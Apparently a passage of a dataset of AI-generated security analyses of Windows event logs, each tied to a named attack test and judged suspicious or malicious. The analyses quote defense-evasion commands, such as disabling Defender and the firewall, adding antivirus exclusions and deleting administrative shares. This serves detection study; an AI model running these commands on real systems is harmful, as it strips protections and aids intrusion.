Given the presence of potentially questionable behavior involving file ownership modifications and the need for further investigation into the context and intent of these activities but no direct evidence of compromise:

**Resolution: SUSPICIOUS**

The observed behavior triggers suspicion due to its alignment with tactics seen in privilege escalation and system alteration scenarios. Additional investigation is required to clarify the intent and authorization of these actions."
Tamper with Windows Defender Registry - Reg.exe,"The provided Windows event logs reveal several indicators of potentially malicious activity. Below is a detailed analysis highlighting the significant findings:

1. **Windows Defender Deactivation:**
   - Multiple entries in the Application logs indicate that Windows Defender is repeatedly turned off (`SECURITY_PRODUCT_STATE_OFF`). This is suspicious and often a sign of malicious activity attempting to disable security software.

2. **Registry Tinkering via Command Line (Sysmon Log):**
   - There is an extensive use of `cmd.exe` alongside `reg.exe` to modify Windows Defender settings by disabling various protection and monitoring capabilities. The command line includes disabling spyware, antivirus, behavior monitoring, and several other real-time protection measures. This behavior is highly indicative of malicious intent aimed at reducing system defenses.

3. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - The Sysmon logs show frequent executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user, which might suggest attempts to read or alter the event logs to hide traces of activities.

4. **Time Manipulation (System Log):**
   - The security logs show changes in the system time, which could be used to mislead automated logging and timestamp-based security measures. While time adjustment might occasionally be legitimate, recurring inconsistencies in system times can be symptomatic of malicious activity.

Overall, analyzing these logs indicates a concerted effort to disable security measures (Windows Defender), modify system settings, and potentially hide actions. This activity aligns with behavior often seen in malware infections aiming to establish persistence or data exfiltration. The various actions documented within these logs strongly suggest an attempt to compromise system integrity.

**Resolution**: MALICIOUS

**Guidance on How to Proceed:**
- Immediately isolate the affected system (Server002) from the network to prevent any further potential data exfiltration or lateral movement.
- Conduct a full malware scan using a reliable, updated anti-malware solution on the isolated machine.
- Review and restore the tampered security settings, particularly those linked to Windows Defender and other network protections.
- Investigate other hosts on the network for similar indicators of compromise to ensure no other systems are affected.
- Collect all logs and detailed timestamps of the alterations for follow-up with legal or forensic investigation teams if required. 
- Consider resetting administrative credentials and performing a thorough review of account activities.

These steps should help mitigate the immediate threat and begin the recovery process for the affected system."
DLP Evasion via Sensitive Data in VBA Macro over HTTP,"### Detailed Analysis of the Windows Event Logs

#### Security Log Analysis
1. **Event ID 4616**: Indicates a system time change by `svchost.exe` involving the `LOCAL SERVICE` account. Time changes can often be indicative of tampering to alter log timelines or an administrator correcting the time. However, isolated, a single occurrence might not be alarming.
   
2. **Event ID 5379**: Multiple occurrences where an attempt was made to access `MicrosoftAccount` credentials and WindowsLive tokens with return code `3221226021`, which signifies a ""name not found"" error. This could point to failed attempts at accessing credential data. While one or a few such logs might be normal, repeated failures might indicate unauthorized probing for user credentials.

3. **Event ID 4624 and 4672**: Show an `admin_test` user with elevated privileges logging in from `DESKTOP-3HL5B2P` using NTLM authentication. The use of multiple privileges such as `SeDebugPrivilege`, `SeSecurityPrivilege`, etc., indicates potential for elevated actions, which is common in admin logons but should be verified for legitimacy. The use of NTLM and the logon type (3) might imply remote access that is worth noting.

#### System Log Analysis
- **Kernel-General (Event ID 1)**: Indicates system time change, consistent with the Security log Event ID 4616, reinforcing the details on time manipulation.
  
- **Windows Update Client Events**: Regular updates for `Microsoft Defender Antivirus` with no immediate signs of tampering. However, the processes such as `wuauclt.exe` spawning `AM_Delta.exe` and `MpSigStub.exe` are normal behavior during definition updates.

#### PowerShell Log Analysis
- **PowerShell Event ID 600**: The execution of a PowerShell script including the `Invoke-WebRequest` command to `127.0.0.1` with a potentially suspicious file path is anomalous. This may imply a local web server or script execution via a macro-infected Excel file (`data-cc-macro.xlsm`), and warrants deeper inspection, particularly if associated with unauthorized changes.

#### Sysmon Log Analysis
- **Sysmon Process Creation Events**: Frequent use of `whoami.exe`, `wevtutil.exe`, and host utilities like `hostname.exe`. These can be used for reconnaissance and system auditing by attackers. Notably, `whoami.exe` and `wevtutil.exe` appearances coinciding suggest potential probing or clearing of Windows Event Logs.

- **Unexpected or Unusual Executables**: Execution of `MicrosoftEdgeUpdate.exe` and `setup.exe` suggest legitimate updating processes, but context like timing or originating process/user can signal lateral movement tactics.

### Assessment Summary
The given logs showcase several points of interest:
- **Suspicious Behavior**: The repeated 5379 events within a short time. They align with possible credential probing.
- **PowerShell Command Execution**: Particularly one involving powershell.exe scripts executing potentially malicious macros (i.e., `data-cc-macro.xlsm`) raises concern of compromise.
- **Elevated Privileges**: Logons featuring `SeDebugPrivilege` and related can command significant control over the system, something that typically merits investigation to confirm it aligns with regular admin behavior.

### Threats and Risks Identified
- Potential reconnaissance or data probing behaviors via PowerShell and credential access events.
- Possibility of compromise through macro-driven scripts detected in PowerShell logs.

### Guidance and Resolution
Given the logs, which contain elements of suspicious PowerShell script executions and repeated credential access attempts:

**Resolution: SUSPICIOUS**

The activity is suspicious but not conclusively malicious. It warrants further investigation to verify the legitimacy of the elevated logon activities and the PowerShell command execution.

- **Further Investigation Steps**: 
  - Validate the `admin_test` logons.
  - Determine the origin of the PowerShell execution and examine the contents or actions associated with `data-cc-macro.xlsm`.
  - Confirm the legitimacy of credential access attempts and their relation to current user activities on the machine.

- **Recommended Actions**:
  - Engage in user and behavior analytics to monitor future anomalies.
  - Perform a thorough sweep to ensure no malicious payload or backdoor persists.
  - Review the necessity and security of NTLM authentications especially for users with elevated privileges."
Disable Administrative Share Creation at Startup,"The task is to analyze the provided Windows event logs for any indicators of potentially malicious activity or compromise.

### Analysis:

1. **Time Change Events in System Log:**
   - Multiple entries indicate changes in system time involving the Windows Time Service. Time skew and manipulation can be associated with attempts to disguise malicious activity, such as modifying log timestamps. However, in this context, the time changes are minimal and consistently logged, indicating typical time synchronization operations rather than direct tampering.

2. **Admin Privilege Logons in Security Log:**
   - There are instances of user `admin_test` logins with high-level privileges (Event 4672) using NTLM over network logons (Logon Type 3). Admin level privileges with SeDebugPrivilege among others can be concerning if unexpected or if this user account has been compromised.
   - However, without more context on the legitimate use of this account, it's ambiguous whether this is an authorized admin performing standard tasks or malicious activity. Further inspection into expected admin account behavior in the organization may be warranted.

3. **Process Execution in Sysmon Log:**
   - There are several Sysmon logs indicating execution of basic system utilities (such as `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and registry edits using `reg.exe`). These are typical processes, but the execution of `cmd.exe` with registry edits (involving `AutoShareServer` and `AutoShareWks`) without clear context can be suspicious, as such actions can be used to prevent sharing and mask activities on the network.
   - The presence of `reg.exe` to manipulate registry keys suggests an attempt at altering system settings which could be benign if initiated by IT under approved protocols, but can also be associated with post-exploitation techniques or configuration to hide malicious activity.

4. **Microsoft Edge Updates in Sysmon Log:**
   - Multiple events are logged related to `MicrosoftEdgeUpdate.exe`. These appear to correlate with Edge browser updates. Such updates entail processes being spawned by SYSTEM integrity users which are typical for legitimate software update processes.
   - SHA256 hashes associated with these processes are not matched against any known bad signatures but ideally, should be cross-referenced with a threat database for confirmation.

5. **Application Log:**
   - Records show Edge Update 'Service stopped'. Such application service stops could be standard depending on system policy, maintenance schedules, or again relevant software updates unless unplanned stops are detected, might signal tampering or denial of service type issues.

### Conclusion:

The logs show some potentially problematic behaviors, particularly around administrator logins with high privileges and certain command executions. However, there is not enough definitive evidence to clearly indicate outright malicious activity given the context could be system updates or admin tasks. 

### Final Resolution: **SUSPICIOUS**

**Guidance:**
- Investigate the `admin_test` user's activity further to verify the legitimacy of the privileged access logged during this period.
- Assess whether any unusual network shares have been affected, especially concerning the registry entries modified (`AutoShareServer`, `AutoShareWks`).
- Continuously monitor for any future logs/events with similar patterns or behaviors, especially focusing on unauthorized account activities.
- Verify processes and scripts originating from known administrators with associated change tickets or logs, confirming they align with security policies.

Further scrutiny with context from IT admin activities or network traffic patterns could help clarify the nature of these events."
Windows - Timestomp a File,"### Detailed Analysis:

Upon examining the provided logs, several points emerge that raise suspicions about potential malicious activity:

1. **PowerShell Logging (Event IDs 1091-1098):**
   - The logs indicate that `powershell.exe` was used to import a suspicious script `timestomp.ps1` located in the temp directory. This script is used to tamper with file timestamps which is a known tactic used by attackers to obscure their presence and the timing of their activities.
   - The command including the use of `timestomp` can be indicative of an attempt to manipulate the timestamps of files (`kxwn.lock`) on the system, confirming potentially malicious intent.

2. **Sysmon Logs (Event IDs 17978-18041):**
   - **Process Execution Traces:** There is a notable pattern of `powershell.exe` executing with elevated privileges (""IntegrityLevel"": ""High"") and performing operations associated with the imported script. The script path and execution context imply potential exploitation.
   - **Excessive Use of Svchost and Wevtutil:** These logs show numerous instances of `wevtutil.exe` and `svchost.exe` use which, although potentially normal, can also signify log clearance attempts or service alterations as part of stealth techniques.
   - **Edge Update Activity:** The repeated execution of Microsoft Edge update services (i.e., `MicrosoftEdgeUpdate.exe`) and associated components such as `MicrosoftEdgeUpdateComRegisterShell64.exe` could be legitimate; however, its involvement in elevated activities post-PowerShell execution could indicate it is being manipulated to ensure persistence or delivery of payloads.

3. **Application Logs:**
   - Frequent ""Service stopped"" messages related to Edge updater at a time contiguous with identified suspicious PowerShell activity. This could signify an attempt to trigger updates or modify the service state for malicious purposes.

### Assessment:
Based on the logs, strong evidence suggests a potential compromise due to the presence of:

- Usage of a known malicious script `timestomp.ps1`.
- Anomalous PowerShell activity involving file timestamp manipulation.
- Elevated privilege execution consistent with privilege abuse tactics.
- Coincidence of Edge updater activity with suspicious script execution suggesting possible misuse of legitimate software for persistence or delivery mechanisms.

### Resolution:
- **MALICIOUS**: The activities observed—such as timestamp manipulation using `timestomp.ps1`, running PowerShell scripts with elevated permissions, and tying these activities to processes potentially being leveraged for persistence or concealment—strongly suggest malicious behavior.

### Guidance on How to Proceed:
1. **Immediate Containment Measures:**
   - Isolate the affected host (Server002) from the network to prevent further infiltration or data exfiltration.
   - Suspend accounts involved in this activity (e.g., `SERVER002\admin_test`) until a full investigation is completed.

2. **Forensic Analysis and Cleanup:**
   - Conduct a thorough forensic analysis to capture memory and disk images for further investigation.
   - Analyze `timestomp.ps1` and any other scripts within the same directory for malicious content or additional indicators of compromise.
   - Identify other systems or accounts that may have been accessed using the same techniques and take appropriate remedial actions such as password resets or system re-imaging.

3. **Strengthen Security Posture:**
   - Review and enhance PowerShell execution policies and implement strict monitoring.
   - Employ stricter endpoint detection measures for TTPs such as timestomping.
   - Audit and restrict unnecessary administrative privileges to reduce exposure to advanced attacks. 

It is crucial to initiate these steps promptly to mitigate ongoing threats and prevent further intrusion."
Invoke CHM Shortcut Command with ITS and Help Topic,"Upon analyzing the provided logs, several suspicious activities and indicators suggest possible malicious activity on the system. Here's a breakdown of the findings:

1. **Execution of PowerShell Commands:**
   - Logs indicate multiple instances of PowerShell execution with specific scripts executed by the `admin_test` user, including `""powershell.exe"" & {Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`. This is highly suspicious as it employs less common techniques and parameters (`Invoke-ATHCompiledHelp`) which might be used for exploitation or to maintain persistence.

2. **Process Creation and File Paths:**
   - PowerShell instances were run from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`), which is typically abnormal for legitimate scripts and potentially indicative of malware or an actor using the space to execute malicious code.
   - The PowerShell commands are appearing reasonably complex and suggest purpose-built scripts, which are not typically generated by standard system or user operations.

3. **Compromised Privilege and Integrity Level:**
   - Some processes, including PowerShell, are running with ""High"" integrity levels which could mean execution with elevated privileges. This is a common behavior for privilege escalation attempts.

4. **Command-Line Usage:**
   - The presence of command-line usage, particularly PowerShell commands with convoluted parameters, is often typical in attack scenarios where an attacker is attempting to move laterally or discreetly deploy scripts.

5. **Anomalies with Process Names and Execution:**
   - The use of utility tools like `wevtutil.exe`, `conhost.exe`, and commands like `whoami` in a rapid sequence can suggest reconnaissance activities.

6. **No Immediate Detection of Successful Exploitation:**
   - While no explicit exploitation was identified, the combination of tools, methodical process invocation, and the suspected command scripting highly points towards preparatory malicious activities.

**Final Assessment:**

Based on the behavior observed, particularly the suspicious use of PowerShell and the execution context (elevated privileges from a TEMP directory), I assess that these logs strongly suggest the possibility of compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Containment:**
   - Isolate the affected system to prevent potential lateral movement or data exfiltration.

2. **Further Investigation:**
   - Conduct a full memory and disk analysis on the affected system for signs of malware or additional dropped files that may not be visible in logs.
   - Review other related logs for additional context, particularly focusing on network activity and potential outbound connections.

3. **Implement Remediation:**
   - Reevaluate privileges and access controls for the `admin_test` account.
   - Consider resetting credentials and reconfiguring security settings to bolster defenses against similar intrusions.
   - Update and patch all systems, ensuring all security measures are up-to-date.

4. **Monitoring and Alerting:**
   - Enhance monitoring for similar suspicious activities across the network.
   - Deploy anomalous behavior detection tools to catch similar activities earlier in the future."
Uninstall Sysmon,"### Detailed Analysis of the Provided Windows Event Logs

**Security log:**  
The security log is not provided; therefore, no analysis can be drawn from it.

**Windows PowerShell log:**  
The PowerShell log has not been provided. This makes it difficult to determine if any malicious scripts or commands were executed via PowerShell.

**Application log:**  
The logs show entries related to the `edgeupdate` service and the `Microsoft-Windows-Security-SPP`.

1. **Edgeupdate Service Stopped (EventRecordID: 2382 & 2384)**
   - The `edgeupdate` service, which is responsible for updating Microsoft Edge, has stopped twice in quick succession. While stopping the service can be normal, repeated stops and starts in a short period may require further checking to ensure there are no tampering or malicious updates being propagated. 

2. **Software Protection Platform Service (EventRecordID: 2383)**
   - The Software Protection Platform Service, which verifies the integrity and licensing of Microsoft software, created a log entry with ""2024-10-29T08:05:59Z, RulesEngine"". This entry seems routine, indicating the rules engine is functioning, but the timing suggests attention to any licensing or activation issues.

**System log:**

1. **Microsoft-Windows-FilterManager (EventRecordID: 3573)**
   - This event indicates a filter driver, specifically `SysmonDrv`, is operating (as captured in the data: ""DeviceName"":""SysmonDrv""). Sysmon (System Monitor) Drivers are used for monitoring and logging system activity. The existence of this event suggests system monitoring is in place, which usually indicates the presence of Sysinternals Sysmon, a legitimate tool for process and network connection monitoring.

### Assessment

- **Suspicious Behaviors:**
  - The stopping of the `edgeupdate` service twice rapidly is somewhat unusual but not inherently suspicious. It may suggest a software update issue or service malfunction rather than a compromise. 
  - The system monitoring via SysmonDrv as observed in the system log is typically benign, but if unauthorized, would be a point of concern.

- **No Clear Indicators of Malicious Activity:**
  - The log entries provided do not show usual indicators of compromise such as unauthorized admin access, suspicious PowerShell execution, or unexpected changes in system configuration.
  - The entries captured in the logs lack specifics on process creation or suspicious privilege escalations.

### Recommendation

Given the available information:

**Resolution: SUSPICIOUS**

The logs at hand raise slight concerns primarily about the service stopping behaviors. I recommend:

- **Further Investigation** on the frequent stopping and starting of `edgeupdate`.
- **Review Associated Logs** for missing entries especially from the security and PowerShell logs to determine if there were any concurrent unusual activities (like script executions or changes to service states) that could explain the behavior.
- **Check for Unauthorized Monitoring Tools** like Sysmon, ensure they are being used correctly by authorized security personnel.

If further suspicious logs are identified or unexplained behaviors continue, escalate the investigation and consider more in-depth integrity checks and network traffic analysis."
Tamper with Windows Defender ATP PowerShell,"Upon reviewing the logs, several notable observations indicate potential malicious activity on the Windows host, particularly concerning the CEO's machine, Server002. 

**1. PowerShell Activity Logging:**
- The logs indicate multiple entries related to PowerShell execution with EventID 600. These logs show the execution of a PowerShell command that disables multiple security features of Windows Defender:
  - `Set-MpPreference -DisableRealtimeMonitoring 1`
  - `Set-MpPreference -DisableBehaviorMonitoring 1`
  - `Set-MpPreference -DisableScriptScanning 1`
  - `Set-MpPreference -DisableBlockAtFirstSeen 1`
- Disabling these features is dangerous and often associated with malicious actors attempting to evade detection. This activity is particularly alarming as these are common techniques used in malware scripts.

**2. Application Log - Windows Defender:**
- Multiple entries in the Application log (EventID 15) show that Windows Defender was set to ""SECURITY_PRODUCT_STATE_SNOOZED."" This state change is consistent with the PowerShell command mentioned above, confirming that Windows Defender's real-time protection was indeed disabled.

**3. Sysmon Log:**
- Events captured here show expected Windows processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `svchost.exe` running under the user `SERVER002\admin_test`. These events do not individually appear suspicious unless linked with the broader context of the Defender being disabled.
- A critical observation is the `PowerShell.exe` execution from a high-integrity level, issued from a directory typically associated with user-specific operations (`C:\Users\ADMIN_~1\AppData\Local\Temp\`). Such execution can imply either script execution through a less monitored environment or privilege escalation attempts.

**4. Security and System Logs:**
- Both Security and System logs show signs of possible time alteration attempts (EventID 4616), which can often be part of attempts to hide tracks, spoof log generation times, or confuse forensics analysis.

**Conclusion and Guidance:**

The analysis indicates a coordinated attempt to tamper with security protocols on the CEO's machine, Server002. The disabling of Windows Defender's real-time protections and the subsequent system time manipulations are firm signs of malicious intention.

**Resolution: MALICIOUS**

Immediate actions should be taken to:
- Isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.
- Conduct a thorough investigation to trace back how this command was executed on the system (e.g., via email phishing, malicious download, or insider threat).
- Restore the machine from a known good backup and ensure adequate defenses are re-enabled and operational.
- Audit other systems for similar indicators, especially those with broad network access or handling sensitive data.
- Engage with legal and forensic teams if necessary to understand the full impact and origin of this breach."
Remove Administrative Shares,"Upon reviewing the provided Windows event logs, several points of interest and potential signs of suspicious activity have been identified. The logs were reviewed across multiple categories: System, Sysmon, Application, and Security logs.

### Analysis:
1. **System Log & Security Log:**
   - **Time Change Events:** There are multiple events related to time change (`EventID: 24` and `EventID: 1` from ""Microsoft-Windows-Kernel-General"", and `EventID: 4616` from ""Microsoft-Windows-Security-Auditing"") showing adjustments made by `svchost.exe`. This can be common for time synchronization purposes, but it should be confirmed that this is consistent with expected behavior on the system.

2. **Sysmon Log:**
   - **Unusual Process Execution:**
     - A process command `cmd.exe` with the argument `/c for %%i in (C$ IPC$ ADMIN$) do net share %%i /delete` is executed, aiming to delete shared resources. This behavior is not typical for standard user operations and can indicate potential compromise or malicious actions to disrupt typical network share functionalities or cover tracks.
     - Several executions of `net.exe` and `net1.exe` attempting to delete default hidden shares (C$, IPC$, ADMIN$) are observed, which is highly suspicious as these actions are often associated with nefarious activities aiming to alter network settings or permissions.
   
   - **High Integrity Processes:**
     - Processes such as `whoami.exe` and `cmd.exe` running with high integrity level, along with the parent process being `wsmprovhost.exe`, demand attention, especially when involved with altering system configurations.

3. **Application Log:**
   - The `Software Protection Platform Service` logs do not present any immediate threat indicators by themselves; however, its temporal proximity to the other suspicious activities warrants further examination in the broader context.

### Assessment:
- **Time Manipulation**: While legitimate systems might synchronize time via `svchost.exe`, the context here raises a flag due to its timing and subsequent activities.
- **Deletion of Network Shares**: The `cmd.exe` executing commands to delete critical network shares (`C$`, `IPC$`, `ADMIN$`) is a clear indicator of possible malicious intent.

### Conclusion and Resolution:
Based on the reviewed events, the behavior observed, including the deletion of critical network shares and time manipulation, suggests potential malicious actions. These actions could aim to disrupt network services, exfiltrate data, or perform unauthorized administrative actions on the network.

**Final Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Isolate the affected machine, Server002, from the network to prevent further spread or damage.
   - Begin incident response procedures to contain and eradicate potential threats.

2. **Investigation:**
   - Review all recent system changes, including user account activities and installations not recorded in the provided logs.
   - Check for any changes to security policies or configurations on the affected and neighboring systems.

3. **Remediation:**
   - Restore deleted network shares and ensure proper security configurations are in place.
   - Perform a full malware scan on the isolated system and other potentially affected network components.

4. **Post-Incident Measures:**
   - Implement additional monitoring rules for suspicious command executions like those observed.
   - Conduct user training and review current security policy efficacy, strengthening defenses against similar incidents in the future."
RDP Authentication Level Override,"Based on the analysis of the provided Windows event logs, the following findings and interpretations can be derived:

1. **Process Execution and Command-Line Activity:**
   - There are several entries in the Sysmon logs showing the execution of `wevtutil.exe` and `conhost.exe` by the `SERVER002\admin_test` user. These processes being executed in a pattern with no apparent reasoning can raise suspicion depending on the context. `wevtutil.exe` is often used to manipulate event logs, which could indicate an attempt to cover tracks if misused by a non-standard user or in inappropriate patterns.
   - There is a notable command-line activity using `cmd.exe` to modify the Windows registry via `reg.exe` with the command `""cmd.exe"" /c reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f`. This action, executed by the same user, could be related to changing security settings, which may be suspicious if performed without proper authorization or operational justification.

2. **Privilege Escalation Attempts:**
   - A security event with ID 4672 indicates that `admin_test` was granted special privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges are typically associated with high-level administrative tasks and are often indicative of potential privilege escalation attempts or the preparation for lateral movement within the network.

3. **Network and Authentication Patterns:**
   - There is a logon event (event ID 4624) where `admin_test` logged on using the NTLM authentication package from a remote workstation `DESKTOP-3HL5B2P`. This could suggest remote access to the system, which must be legitimate and authorized to qualify as benign.

4. **Time Change in Logs:**
   - There are Kernel-General events (ID 1) showing a time change on the system. While not inherently malicious, unsanctioned time changes can affect log integrity, potentially being indicative of concealment of actions.

5. **Application Events:**
   - Events related to `edgeupdate` suggest a routine service operation; however, with the timing under scrutiny, it's good to verify whether the actions align with expected updates.

**Conclusion:**

- **SUSPICIOUS:** The logs contain several activities that warrant further investigation. The combination of `wevtutil.exe` usage, registry manipulation through `cmd.exe` and `reg.exe`, and privilege escalation events suggest potential misuse or unauthorized changes that should not occur under normal circumstances without explicit authorization and knowledge.
  
- **Recommendations:**
  - Verify the legitimacy of the `admin_test` user actions: Ensure that the command-line events and privilege changes were part of authorized administrative tasks.
  - Investigate the context around the `cmd.exe` registry change: Determine if it aligns with any policy changes or if it was an unsanctioned modification.
  - Review workstation `DESKTOP-3HL5B2P` from which the NTLM logon was initiated to ascertain if it aligns with business operations.
  - Consider deploying additional monitoring or alerts to detect similar suspicious activities in the future."
Tamper with Windows Defender Evade Scanning -Extension,"Upon reviewing the provided Windows event logs, there are several items of interest that may indicate suspicious activity. Let's break down each part of the logs:

1. **Windows PowerShell Log:**
   - There is evidence of PowerShell being executed with a command to modify Windows Defender exclusions: `Add-MpPreference -ExclusionExtension "".exe""`. This command is indicative of an attempt to exclude executable files from being scanned by Windows Defender, which is often used by attackers to reduce the likelihood of detection by antivirus solutions.
   - The logs show repeated activity related to PowerShell, indicating potential misuse to manipulate system settings or execute scripts.

2. **System and Sysmon Logs:**
   - Frequent execution of Windows utilities (`wevtutil.exe`, `conhost.exe`, and `whoami.exe`) is noted, which might be reasonably benign if they align with known administrative tasks. However, consistent logging of these processes with user `SERVER002\\admin_test` suggests possible automated activity or script execution.
   - The use of `HOSTNAME.EXE` and `whoami.exe` to gather system information can be normal, but frequent or repeated use in close succession could indicate information gathering by an unauthorized actor as part of reconnaissance.

3. **Application Log:**
   - There are logs associated with Microsoft Edge Update which appear benign and part of normal update processes. However, the sheer volume and variants of the processes involved (such as EdgeUpdate) require careful context consideration to rule out any suspicious modifications or scripts disguised as legitimate updates.

**Assessment of the Situation:**
- The combination of PowerShell being used to set antivirus exclusions and the frequency of system utilities being executed could point toward potentially malicious behavior, especially if there's no legitimate administrative activity scheduled at that time.
- The logs do not provide evidence of a direct attack, such as malware payloads or active exploitation, but the PowerShell activity warrants deeper investigation.

**Guidance on How to Proceed:**
- **Isolate the Host:** As a precaution, isolate the CEO's host from sensitive networks until the investigation concludes.
- **Investigate PowerShell Activities:** Further analyze the context and origin of the PowerShell commands to determine if they were legitimate or unauthorized. This could involve checking scheduled tasks, startup scripts, user behavior logs, and cross-referencing with the organization's change management records.
- **Review User Account Activities:** Check if the `admin_test` account was involved and ensure it has not been compromised.
- **Conduct Network Traffic Analysis:** Monitor for any suspicious outbound connections that might suggest data exfiltration or unauthorized network communications.

**Resolution: SUSPICIOUS**
The behavior detailed above warrants further investigation due to the potential security risks associated with the PowerShell commands observed and the use of system utilities in rapid succession. This could be an early stage of a compromise, requiring thorough validation before ruling it benign."
WMIC Tamper with Windows Defender Evade Scanning Folder,"**Analysis of the Windows Event Logs:**

**1. Overview of Observations:**
- The logs primarily detail events from Sysmon, Application, System, and Security logs, mostly pertaining to processes executed on `Server002`.
- The PowerShell logs provided no information.
- Notable processes include `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `wmic.exe`, and `svchost.exe`.

**2. Suspicious or Anomalous Behavior:**
- **Repeated Execution of System Processes:**
  - `wevtutil.exe` and `conhost.exe` are seen executed multiple times sequentially and at very close time intervals (milliseconds apart). This might be part of some script or an automation process.
  
- **High Integrity Level Execution:**
  - Commands executed are running at a ""High"" Integrity Level repeatedly under `SERVER002\admin_test`. While this might not be immediately alarming, frequent high-privilege executions can suggest elevated risk.
  
- **WMIC Usage to Modify Windows Defender:**
  - The log files indicate that `wmic.exe` was run with a command to add an exclusion path to Microsoft Defender: 
    ```
    wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=""file""
    ```
  - This is a significant finding and a strong indicator of malicious activity, as malware often adds itself to exclusion lists to avoid detection by security software.
  
- **Time Changes:**
  - The `System` and `Security` logs show time synchronization or modification events. These align with known changes by `svchost.exe`. They might not imply malicious activities on their own; however, they should be observed if other anomalies align, especially on endpoints with previous timezone change-related attacks.

**3. Assessment of Potential Malicious Activity:**
- The `wmic.exe` command execution to alter Defender settings is a highly indicative sign of compromise since attackers might use this to disable parts of the antivirus or hide malicious files.
- The repetitive and scripted-like execution patterns of several processes could either be an automated maintenance script or a malicious script.

**Threats or Risks Identified:**
- Unauthorized security setting changes using WMIC is a significant risk since it renders parts of the system unprotected from malware.
- Frequent high-privilege processes can indicate risk if unauthorized, potentially hinting at privilege abuse or misconfiguration.
  
**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Block the user account `SERVER002\admin_test` if it is deemed unauthorized or if the activity was not approved.
   - Verify if any exclusion paths were added or altered in Windows Defender and revert changes as necessary, especially focusing on any paths referring to critical system files or directories.

2. **Further Investigation:**
   - Perform a deeper forensic analysis to identify the origin of the `wmic.exe` execution and confirm if malicious scripts were used.
   - Check for additional system changes or configurations that match known indicators of compromise.
   - Investigate the intent and origin of the timed executions of `wevtutil.exe`, `hostname.exe`, etc.

3. **Monitoring and Resolution:**
   - Strengthen monitoring on `Server002` and similar systems for unusual process executions, especially those invoking administrative tasks or security changes.
   - Implement more stringent security policies to prevent unauthorized script executions.

**Resolution: MALICIOUS** - The command to alter Windows Defender settings is indicative of an attempt to disable or bypass the security features on the host, aligning strongly with patterns seen in compromised environments."
Disable Microsoft Defender Firewall,"### Analysis

Upon analysis of the provided Windows event logs, the focus is primarily on the behavior of processes, privilege handling, and any unusual activities that might indicate malicious intent. Here are key observations:

#### System and Security Logs
- **Time Change Events**: Multiple instances of time changes (Event ID 4616) handled by `svchost.exe` are recorded, which can sometimes be indicative of attempts to manipulate time for bypassing scheduling or auditing mechanisms, but these do not appear immediately suspicious due to their association with the normal time synchronization process.
- **Service Start Type Change**: A service type change for `IKEEXT` from `demand start` to `auto start` (Event ID 7040) appears legitimate.
- **Logon Events**: The `admin_test` account shows multiple logon events (Event IDs 4624 and 4672) with numerous elevated privileges. The presence of such high privileges, especially `SeDebugPrivilege` and others, indicates that the account is either heavily trusted or potentially compromised.
  
#### Sysmon Logs
- **Process Creation Events**: There are multiple instances of system utilities being executed by `SERVER002\admin_test`:
  - `whoami.exe`: Used to check the logged-in user.
  - `HOSTNAME.EXE`: Displays the computer name.
  - `cmd.exe` executing `netsh advfirewall set currentprofile state off`: This command disables the firewall for the current network profile, which is highly suspicious and indicative of potentially malicious behavior intended to lower system defenses.
  - Several instances of `wevtutil.exe` and `conhost.exe` execution, actionable typically for event log manipulations.

#### Overall Assessment
- The execution of `cmd.exe` for firewall manipulation is particularly concerning and indicates a deliberate action to weaken system security.
- The account `admin_test` performing these actions has high-level privileges, potentially indicating compromise.
- Although no explicit signs of data exfiltration or further exploitation are evident in these logs, the activity pattern suggests caution.

### Final Resolution: **MALICIOUS**

### Recommendations
1. **Immediate Containment**: Restrict network access for the machine to prevent potential lateral movement or data exfiltration.
2. **Credential Audit**: Verify the legitimacy and security of the `admin_test` account and consider a password change and broader credential review.
3. **Firewall Re-enablement**: Ensure all firewall configurations are intact and not in a disabled state.
4. **Further Investigation**: Conduct a comprehensive forensic analysis of the system to determine the extent of potential compromise and identify any additional persistence mechanisms or malware.
5. **Review and Monitoring**: Implement enhanced logging and monitoring to catch similar malicious behaviors in the future and evaluate existing endpoint protection policies."
UACME Bypass Method 39,"Upon analyzing the provided Sysmon and Application logs, here are the observations and potential conclusions:

### Suspicious or Anomalous Behavior:
1. **Use of Command Prompt and PowerShell**:
   - The logs show the execution of `cmd.exe` and `PowerShell.exe` under a high integrity level by the user ""SERVER002\\admin_test"". The command line involves echoing a suspicious path leading to `Akagi64.exe`:
     ```
     C:\\Users\\admin_test\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\39 Akagi64.exe
     ```
   - The file `Akagi64.exe` was executed. This file is not standard and its presence in the user's Temp directory typically is unusual, especially if not sanctioned or expected.

2. **Execution of System Utilities**:
   - There is frequent execution of system utilities like `wevtutil.exe`, and `conhost.exe`. While not inherently malicious, the creation of processes in quick succession could potentially indicate a scripted or automated task, especially if used for log manipulation or to clear traces.

3. **Windows Hosts and WhoAmI Commands**:
   - Executions of `hostname.exe` and `whoami.exe` suggest information gathering activity. These are commonly used in both legitimate diagnostics and initial access or recon activities by an attacker.

4. **Microsoft Edge Update Activities**:
   - A sequence of processes related to `MicrosoftEdgeUpdate.exe` is ordinary behavior for updating the Edge browser. However, frequent updates in rapid succession to different sub-processes might be worth a closer look if external networking traffic corresponds with these updates.

### Indicators of Malicious Activity:
1. **Command Execution from a Temp Directory**:
   - Executing a binary (Akagi64.exe) from a Temp directory as seen in `cmd.exe` processes is suspicious. It often indicates malware, temporary payloads, or initial execution vectors.

2. **High Frequency and Various Updates from Edge**:
   - While multiple Edge update processes noted are generally normal, they should be validated to ensure no fake updates or tampering occur from unintended or malicious sources.

